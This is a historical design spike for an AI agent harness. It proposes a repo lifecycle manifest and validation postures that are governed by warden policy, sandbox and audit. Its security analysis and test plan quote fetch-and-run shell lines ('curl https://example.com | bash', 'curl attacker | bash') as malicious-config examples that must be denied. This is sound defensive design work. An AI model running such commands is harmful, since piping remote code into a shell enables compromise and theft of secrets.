# Lifecycle manifest and validation posture spike

**Status:** historical design spike. The lifecycle manifest decision was accepted in ADR-0058 and
its implemented scope is recorded in the current specification and claim ledger.
**Date:** 2026-06-24.
**Scope:** Evaluate two lifecycle/validation primitives for Phase 2A without building remote services
or a second policy engine.

## 1. Executive recommendation

### Candidate 1: lifecycle manifest / repo execution contract

**Historical recommendation:** introduce the schema after capability-manifest work, then implement
only through ordinary Warden-governed execution paths. ADR-0058 records the accepted decision.

Keel should add the primitive, but not as an immediate execution feature and not as a trusted CI-like
workflow runner. A small `.keel/lifecycle.yaml` contract would materially reduce command guessing,
make validation auditable, and give policy/sandbox/audit a stable vocabulary for "run the repo's unit
tests" versus "run arbitrary bash." The risk is that a malicious repo file becomes an authority surface.
The safe design is to treat lifecycle config as untrusted repo data: trust-gated before parse, never a
grant, never a sandbox override, and always lowered into ordinary `warden.execute` requests whose actual
command is classified, policy-checked, sandboxed, and audited. The first accepted PR should be a schema
and fixture corpus only, with no auto-discovery or execution path.

### Candidate 2: validation posture integrated with policy/sandbox/audit

**Recommendation: build the concept now only by extending the existing policy-posture design; reject a
new parallel posture system.**

Keel already has the right conceptual home in ADR-0033: autonomy modes are policy postures over the
warden, not model behavior. Validation posture should be a policy-pack/run-profile dimension that
selects validation requirements, sandbox/egress profile refs, approval behavior, retry eligibility, and
audit strictness. It should not become a second policy engine and should not add a user-facing
`regulated` product tier in Phase 2A. The minimal v1 is a named `postureId` selected by user/run config
and resolved by the warden from a signed/local policy bundle. Audit records can carry posture/bundle IDs
in the open `payload` marker until a compliance-grade claim requires a schema bump.

## 2. Current-state codebase assessment

### Where this fits

The relevant current architecture is:

- `packages/shared/src/policy/side-effect.ts`: frozen `SideEffect` schema. Lifecycle execution must
  produce the same dynamic side-effect classification as any other command.
- `packages/shared/src/policy/input.ts`: `PolicyInput` already carries `sideEffect`, workspace trust,
  provenance, egress, and `session.mode`. It should not grow a second posture field unless a future
  policy implementation proves it needs one.
- `packages/shared/src/audit/record.ts`: `AuditRecord` requires `sideEffect` on `tool.execute` and
  `tool.deny`, with open `payload` for markers. Lifecycle/posture IDs can live in `payload` for v1.
- `packages/shared/src/rpc/methods.ts`: `warden.execute` takes a generic `ToolCall`. A lifecycle action
  can be represented as a tool name or args without changing Appendix A.
- `packages/warden/src/sandbox.ts` and `sandbox-profile.ts`: sandbox profiles are already warden-owned,
  per-call plain data. Lifecycle cannot set them directly.
- `packages/warden/src/rpc-server.ts`: the current `warden.execute` path only supports a narrow opt-in
  bash sandbox probe. Lifecycle execution should wait until policy, classifier, egress, and audit are in
  the same execution path.

### Docs and ADRs that would be touched

- `MASTER_SPEC.md` §3.2, §3.4, §4.2, §4.3, §4.8, §4.9, §7 Phase 2, Appendix A, Appendix B, Appendix D.
- `docs/adr/0024-tool-side-effect-taxonomy.md`: lifecycle commands are classified through the same
  static/dynamic side-effect model.
- `docs/adr/0056-capability-manifest.md`: lifecycle should compose with the capability manifest rather
  than compete with it. Capability manifest remains policy/sandbox/egress source of truth; lifecycle is
  repo validation intent.
- `docs/adr/0033-autonomy-modes-and-approval-ux.md`: validation posture belongs under this policy
  posture model.
- `docs/adr/0038-workspace-trust-gate.md` and `docs/adr/0026-declarative-only-extensibility.md`:
  lifecycle files are post-trust inert data, not executable extensions.

### Existing abstractions

Already exists:

- Trust-gated project metadata reads through `ProjectReader`.
- Generic `ToolCall` over RPC.
- Dynamic side-effect taxonomy with classifier confidence and composition.
- Warden-owned sandbox profile per invocation.
- Audit record `payload` for forward markers.
- Autonomy modes as named policy postures over the warden.
- Local provider seams with fail-closed defaults.

Needed, if accepted:

- `LifecycleManifest` shared schema.
- `LifecycleActionId` vocabulary.
- `LifecycleManifestSource` provider with local default, gated through `ProjectReader`.
- `ValidationRequirement` or `ValidationTier` schema, probably owned by policy bundle/run profile, not
  lifecycle alone.
- Later: loader, resolver, and validator that turn lifecycle actions into normal `warden.execute` calls.

## 3. Proposed minimal v1 design

### Candidate 1: lifecycle manifest

Minimal v1 schema shape:

```yaml
schemaVersion: lifecycle.keel.dev/v1
packageManager: pnpm
root: .

env:
  required:
    - name: DATABASE_URL
      secret: true
      requiredFor: [test.integration]
  optional:
    - name: CI
      secret: false

actions:
  install:
    argv: ["pnpm", "install", "--frozen-lockfile"]
    timeoutMs: 120000
  build:
    argv: ["pnpm", "build"]
  lint:
    argv: ["pnpm", "lint"]
  typecheck:
    argv: ["pnpm", "typecheck"]
  test.unit:
    argv: ["pnpm", "test"]
  test.integration:
    argv: ["pnpm", "test:integration"]
    requiresEnv: ["DATABASE_URL"]
  test.targeted:
    discover:
      kind: node-vitest
      fileGlobs: ["packages/**/*.test.ts"]
    timeoutMs: 60000
  dev:
    argv: ["pnpm", "dev"]
    longRunning: true
  healthcheck:
    argv: ["pnpm", "healthcheck"]

validationTiers:
  standard:
    required: [lint, typecheck, test.unit]
  strict:
    required: [lint, typecheck, test.unit, test.integration]
```

Keep v1 deliberately small:

- Required: `schemaVersion`, `actions`, command shape, timeout defaults.
- Optional: `packageManager`, `root`, env var declarations, validation tiers, targeted test discovery.
- Excluded from v1: egress grants, sandbox allow/deny paths, secrets values, remote CI providers,
  service orchestration, caches, retry rules, matrix builds, Docker/devcontainer inheritance, and command
  templates with interpolation.
- Prefer `argv` arrays. Allowing `shell` strings can be a later feature or a v1 escape hatch with
  `classifier.confidence = ambiguous|obfuscated` if parsing is not exact.

Ownership/source of truth:

- The lifecycle file is repo-owned, therefore semi-trusted at best and untrusted until the workspace is
  trusted. It is authoritative only for repo intent, not for permissions.
- User/run config can override which action to request, but not silently rewrite the command without
  audit evidence.
- A future signed bundle may require or narrow lifecycle validation, but it must not decide tool calls
  remotely.

Flow through the warden:

1. Kernel loads `.keel/lifecycle.yaml` only after workspace trust, through `ProjectReader`.
2. Kernel may show lifecycle actions to the model/TUI as named validation options.
3. When the model or user requests `lifecycle.test.unit`, the kernel sends an ordinary
   `warden.execute` request, for example:

   ```json
   {
     "toolCall": {
       "id": "tc_42",
       "name": "lifecycle.run",
       "args": {
         "action": "test.unit",
         "resolvedCommand": { "argv": ["pnpm", "test"] },
         "manifestHash": "sha256:..."
       }
     }
   }
   ```

4. Warden resolves or verifies the command against the manifest hash, computes dynamic side effects
   from the actual command, evaluates policy, builds the sandbox profile, executes only on `allow`, and
   appends audit.
5. A lifecycle name may help policy address intent, but it never replaces command classification.

Policy-addressable actions:

- Yes, lifecycle actions should become named policy-addressable intents:
  `lifecycle.install`, `lifecycle.build`, `lifecycle.lint`, `lifecycle.typecheck`,
  `lifecycle.test.unit`, `lifecycle.test.integration`, `lifecycle.test.targeted`, `lifecycle.dev`,
  `lifecycle.healthcheck`.
- The policy can say "known lifecycle test under trusted manifest is lower-friction," but only after the
  warden classifies the actual command and confirms the manifest hash. A mismatch downgrades confidence
  and should review or deny.

Sandbox and egress interaction:

- Lifecycle does not declare sandbox authority. Sandbox profile generation stays under capability
  manifest and policy.
- Lifecycle may declare "expected package manager" and "requires env," but egress allowlists come from
  policy/egress presets. A lifecycle `install` command still traverses egress policy.
- If lifecycle says `install: curl https://example.com | bash`, policy sees network read, external
  service, process exec, dataflow, and likely obfuscation. The lifecycle label does not make it safe.

Audit evidence:

- `tool.execute` and `tool.deny`: full `SideEffect`, policy pack ref, result/provenance, manifest path,
  manifest hash, action id, resolved argv, cwd, timeout, env var names injected or missing, sandbox
  backend/tier/profile id, egress profile id, validation tier if part of a validation run.
- `review.requested/resolved`: lifecycle action id and blast radius.
- `session.end` or receipt: validations run, passed, failed, skipped, and not run.

How it avoids policy bypass:

- The manifest is never an allowlist.
- The manifest cannot request sandbox relaxations.
- The actual resolved command is classified and audited.
- Dynamic side effects outside the static/lifecycle expectation become findings.
- Unknown, shell-string, interpolated, or hash-mismatched commands fail closed to review/deny.
- The warden, not the model, resolves final permission.

Local and offline by default:

- Add a `LifecycleManifestSource` interface only when loading lands, with local-file default.
- Carry `manifestHash` and optional `manifestSourceId` in audit payload markers.
- Do not add a network fetch path.

### Candidate 2: validation posture

Minimal v1 model:

```ts
type PostureId = "guided" | "autopilot-dev" | "locked-down";

interface PolicyPosture {
  id: PostureId;
  policyProfileRef: string;
  sandboxProfileRef: string;
  egressProfileRef: string;
  validation: {
    tier: "minimal" | "standard" | "strict";
    requiredLifecycleActions: string[];
    requireCleanWorktree?: boolean;
    requireTargetedTestsForTouchedFiles?: boolean;
  };
  approvals: {
    promptOnReview: boolean;
    allowProjectGrants: boolean;
    batchReviews: boolean;
  };
  retry: {
    readOnlyInfraRetry: "off" | "bounded";
  };
  audit: {
    requireHashChain: true;
    requireDeniedActionRecords: true;
    requireValidationReceipt: boolean;
  };
}
```

Naming recommendation:

- Use `guided`, `autopilot-dev`, and `locked-down` in Phase 2A docs/tests if names are needed.
- Defer `fast`, `standard`, `strict`, and `regulated` as product copy. `regulated` implies compliance
  evidence that Phase 2A does not yet provide.
- If a neutral validation-only field is needed, use `validation.tier = minimal|standard|strict`; do not
  call it a security posture.

Ownership/source of truth:

- The active posture is selected by a human/user config or policy bundle. The repo lifecycle manifest can
  provide validation actions, but it cannot raise posture.
- The warden resolves `postureId` from the loaded policy bundle/run config at session start.
- A future signed bundle may select posture, but local warden enforcement remains the only decision
  path.

Relationship to policy verdict:

- Posture selects policy data and validation obligations. It does not return verdicts.
- The policy engine still returns exactly one verdict for each action: `allow|deny|modify|review|warn`.
- Posture can affect whether a `review` is auto-proceeded under ADR-0033, but it cannot turn `deny` into
  `allow`, cannot change the sandbox directly, and cannot override egress/provenance rules.

Flow through warden/policy/sandbox/audit/TUI:

1. Session starts with `postureId` selected outside the model.
2. Warden loads policy/sandbox/egress/validation profile refs for that posture.
3. Every `warden.execute` gets normal side-effect classification and policy evaluation under the active
   posture data.
4. Validation planner uses posture validation requirements to suggest or require lifecycle actions.
5. Audit records `postureId`, policy pack hash, sandbox/egress profile IDs, and validation receipt data
   in `payload` until claim-grade fields are needed.
6. TUI status line shows only enforced facts, for example:

   ```text
   AUTO-DEV · SBX● · NET:npm,pypi · AUD● · VAL:standard
   LOCKED   · SBX● · NET:deny    · AUD● · VAL:strict
   ```

## 4. Security analysis

### Threats introduced

- Malicious repo config declares `test` as a destructive or exfiltrating command.
- Model cites a lifecycle action name to socially justify a risky command.
- Lifecycle manifest hides risk through shell strings, variable interpolation, package scripts, or
  generated commands.
- Repo tries to raise posture, lower validation, widen egress, or weaken sandbox.
- Posture becomes a second policy system with unclear precedence.
- Audit claims "validation passed" from configured intent rather than observed command results.
- Reserved provider fields accidentally imply remote governance exists.

### Policy bypass risks

Primary bypass risk is semantic laundering: `lifecycle.test` sounds safe even when the command is not.
Mitigation is structural: policy keys off actual `SideEffect` first, lifecycle action second. A policy
rule may grant lower-friction review behavior only when all are true:

- manifest is trusted enough to read but still classified as repo-derived;
- manifest hash matches the resolved action;
- command parses into an exact or conservative classification;
- dynamic effects are within expected bounds for that action;
- sandbox and egress profiles can enforce the resulting effect;
- no secret, unknown, obfuscated, destructive, irreversible, persistent, external write, or untrusted
  egress condition is present unless the policy explicitly reviews or denies it.

### Sandbox mismatch risks

Lifecycle is likely to expose policy/sandbox drift. Example: policy allows `lifecycle.test.unit`, but
the sandbox denies `.env` reads needed by a framework. That should be a `policy_sandbox_mismatch`
finding, not an implicit sandbox relaxation. The sandbox remains authoritative.

### Malicious repo config risks

Lifecycle files are project-local and must follow the trust-before-parse model:

- no read before workspace trust;
- parsed through a bounded schema with size caps;
- inert data only;
- no env value expansion by default;
- no shell execution during loading;
- no import/include from arbitrary files in v1;
- no extension hooks.

### Trust boundary of lifecycle files and posture selection

- Lifecycle file: repo-authored validation intent, untrusted until trust, never authority.
- Posture selection: human/user/org authority, never repo authority, never model authority.
- Policy bundle: local signed/hash-pinned authority for decisions.
- Sandbox profile: warden-owned physical guardrail.
- Audit: warden-owned evidence, never model-reported.

### Required audit evidence

Every lifecycle-backed validation must leave enough evidence for an offline reviewer to answer:

- Which lifecycle manifest was used?
- Which action was requested?
- What command actually ran?
- Who or what requested it?
- Under which posture, policy pack, sandbox profile, and egress profile?
- What side effects were classified?
- What did policy decide?
- What did the sandbox physically permit or deny?
- Which env vars were present by name, and which required env vars were missing?
- What passed, failed, was skipped, or was not run?

## 5. Product/UX analysis

### Material user value

Lifecycle manifest is worth doing because it turns validation from agent guesswork into repo-provided
intent. This is especially valuable for targeted tests, monorepos, unusual package managers, and
healthchecks. Public AGENTS.md research is a caution: long natural-language repo instructions can add
cost and reduce performance when they carry too much process text. A compact structured lifecycle file
should remove command boilerplate from AGENTS.md and keep instructions minimal.

Validation posture is worth doing only if it remains tied to enforcement. It gives users a one-line
answer to "how hard did Keel verify this?" and gives teams repeatable validation behavior. It is not
worth doing as `fast/strict/regulated` marketing labels before the warden can enforce and audit the
differences.

### Agent confusion and validation failures

Lifecycle reduces:

- guessing `npm` versus `pnpm`;
- broad `pnpm test` when a targeted test exists;
- skipped typecheck/lint because command names are unknown;
- hallucinated healthchecks;
- final-answer overclaiming.

Posture reduces:

- unclear "what does Autopilot mean?";
- inconsistent validation ladders across sessions;
- hidden weak verification in fast local runs;
- policy explanation gaps.

### Friction risk

Do not require lifecycle files for alpha. Keel should still infer common commands opportunistically and
ask or report "no lifecycle manifest" honestly. Requiring `.keel/lifecycle.yaml` too early would slow
adoption and make small repos feel bureaucratic.

### TUI surface

Minimal TUI:

- `/lifecycle` shows detected actions and manifest hash.
- Validation prompts say: `Run lifecycle.test.unit? pnpm test · policy: review · sandbox: srt`.
- Receipt includes:

  ```text
  Validation
  - lint: passed (pnpm lint)
  - typecheck: passed (pnpm typecheck)
  - test.unit: failed (pnpm test, 3 failing)
  - test.integration: not run (DATABASE_URL missing)
  ```

- Status line adds validation only when real: `VAL:standard`, `VAL:none`, or `VAL:partial`.
- Never display `regulated` or compliance language without the underlying signed bundles, strict audit,
  and offline-verification story.

## 6. Implementation plan if accepted

### Smallest safe PR sequence

1. **Design/ADR clarification PR.**
   - Record that lifecycle is repo intent, not authority.
   - Record that validation posture extends ADR-0033 and does not create a second policy engine.
   - No schema/protocol change.

2. **Lifecycle schema-only PR.**
   - Add `packages/shared/src/lifecycle/manifest.ts`.
   - Add valid/malformed fixtures and property/wire tests.
   - Include size caps and strict object parsing.
   - No loader, no command execution.

3. **Posture schema in policy-bundle PR.**
   - Add `PolicyBundle`/`PolicyPosture` schema when Epic 2.4/2.5 needs bundle structure.
   - Keep posture IDs as strings with built-in fixture IDs, not a permanent closed product enum.
   - Add tests proving posture cannot produce verdicts outside policy evaluation.

4. **Trust-gated loader PR.**
   - Add `LifecycleManifestSource` local default through `ProjectReader`.
   - Parse after workspace trust only.
   - Show detected actions in inert UI/model context.
   - Audit nothing yet except session metadata if already supported.

5. **Warden lifecycle.run PR.**
   - Add a `lifecycle.run` tool surface or equivalent `ToolCall` convention without Appendix A changes.
   - Warden verifies manifest hash, resolves action, classifies actual command, and executes through
     policy/sandbox/audit.
   - Denied path proves manifest command does not bypass policy.

6. **Validation receipt PR.**
   - Validation planner requests required lifecycle actions for selected posture.
   - Receipt is ledger/audit-derived.
   - TUI status line displays validation posture only when enforced.

### Tests required

Lifecycle schema:

- valid minimal manifest parses;
- unknown top-level keys reject unless under namespaced extension;
- command with both `argv` and `shell` rejects or chooses an explicit rule;
- env values reject;
- path traversal in `root` rejects or resolves inside workspace;
- arrays/maps have DoS size caps;
- `schemaVersion` major mismatch rejects.

Trust and loading:

- manifest not read pre-trust;
- declined workspace produces no lifecycle context;
- malicious manifest body is inert text/data;
- includes/imports are not followed in v1.

Policy/sandbox/audit denied paths:

- `lifecycle.test.unit` mapped to `curl attacker | bash` reviews or denies;
- `lifecycle.lint` attempting to read `.env` is denied by sandbox/policy;
- lifecycle action cannot set sandbox allowWrite outside workspace;
- lifecycle action cannot add egress domain;
- lifecycle action hash mismatch reviews or denies;
- lifecycle action with unknown/obfuscated shell classification is non-retryable;
- `policy_sandbox_mismatch` is emitted when policy allows but sandbox blocks.

Posture:

- repo config cannot raise posture;
- model-emitted posture change is refused;
- posture cannot turn `deny` into `allow`;
- `locked-down` makes unknown/obfuscated shell disposition stricter than `autopilot-dev`;
- audit/session payload records active posture ID and validation tier;
- TUI golden: status line never shows posture stronger than active enforcement.

Validation receipt:

- skipped/missing env is reported as not run, not failed or passed;
- targeted test discovery output is audited with command and selected files;
- final answer cannot claim validation from lifecycle intent alone.

### Migration/deprecation concerns

- No migration for existing repos. Absence of lifecycle manifest is supported.
- Do not move commands from AGENTS.md automatically.
- If later a `keel.policy.yaml` exists, it should reference lifecycle action IDs rather than duplicate
  command strings.
- If later `devcontainer.json` is present, Keel can offer import/advisory mapping, but should not execute
  devcontainer lifecycle scripts as trusted authority.

### Decisions before implementation

- Path/name: `.keel/lifecycle.yaml` versus `.keel/lifecycle.yml`.
- Whether `shell` command strings are allowed in v1 or rejected until the classifier is stronger.
- Whether `lifecycle.run` is a first-class tool name or a `bash` tool call with lifecycle metadata.
- Whether manifest hash is computed over raw YAML bytes or canonical parsed JSON. Prefer canonical
  parsed JSON if comments are not claim-bearing; prefer raw bytes if reviewer UX needs exact file
  evidence.
- Minimum built-in posture IDs for Phase 2A.
- Whether validation tiers live in lifecycle manifest, policy bundle, or both. Recommended: lifecycle
  may define local tiers; policy bundle selects/enforces requirements.

## 7. Reasons to defer or reject

### Candidate 1 defer conditions

Defer lifecycle execution if any of these are true:

- live side-effect classifier is not ready;
- policy and audit are not on the same execution path;
- sandbox egress is not at least fail-closed;
- lifecycle would require Appendix A changes;
- implementation starts to resemble CI orchestration, service management, or workflow DAGs;
- someone wants lifecycle to grant egress or sandbox paths.

Do not reject the primitive outright. The structured command contract is useful and aligned with Keel's
validation/audit thesis. Reject only the unsafe version where repo config is treated as trusted command
authority.

### Candidate 2 defer/reject conditions

Reject a new independent posture system. It would duplicate ADR-0033 and risk becoming a second policy
engine.

Defer product labels like `regulated` until signed bundles, stricter audit, offline verification,
and strict profile conformance exist. In Phase 2A, use implementation
labels such as `guided`, `autopilot-dev`, and `locked-down`, and describe exact enforced behavior instead
of selling a compliance tier.

Defer adding posture fields to frozen audit/policy schemas unless the open `payload` marker cannot
support the evidence needed for the current claim. Wait for a claim-grade need before promoting
bundle/profile IDs to first-class audit fields.

## References used for the spike

- Keel: `MASTER_SPEC.md`, ADR-0024, ADR-0056, ADR-0033, ADR-0038, ADR-0026,
  Epic 2.1, Epic 2.2, and current shared/warden schemas.
- Dev Containers lifecycle scripts show the common shape and the security warning: lifecycle commands
  can run on the host or in the container, and string commands route through a shell. Keel should learn
  the structured lifecycle idea, not inherit authority from repo scripts.
  https://containers.dev/implementors/json_reference/
- GitHub Actions workflow syntax shows the mature CI distinction between configured steps, containers,
  env, fail-fast, and continue-on-error. Keel should not copy CI orchestration into Phase 2A.
  https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax
- AGENTS.md studies are a caution against pushing command/process detail into long natural-language
  instructions. Structured lifecycle is attractive partly because it lets AGENTS.md stay minimal.
  https://arxiv.org/abs/2602.11988 and https://arxiv.org/abs/2606.15828
- Agentic Workflow Injection work reinforces that repo/workflow config and untrusted event content can
  become an injection-to-script path. Keel must keep lifecycle as data until the warden classifies and
  enforces the actual command.
  https://arxiv.org/abs/2605.07135
- Agentic Harness Engineering reinforces the value of explicit, observable harness components and
  falsifiable validation contracts, but Keel should apply that as small provider/schema seams rather
  than broad autonomous harness mutation.
  https://arxiv.org/abs/2604.25850
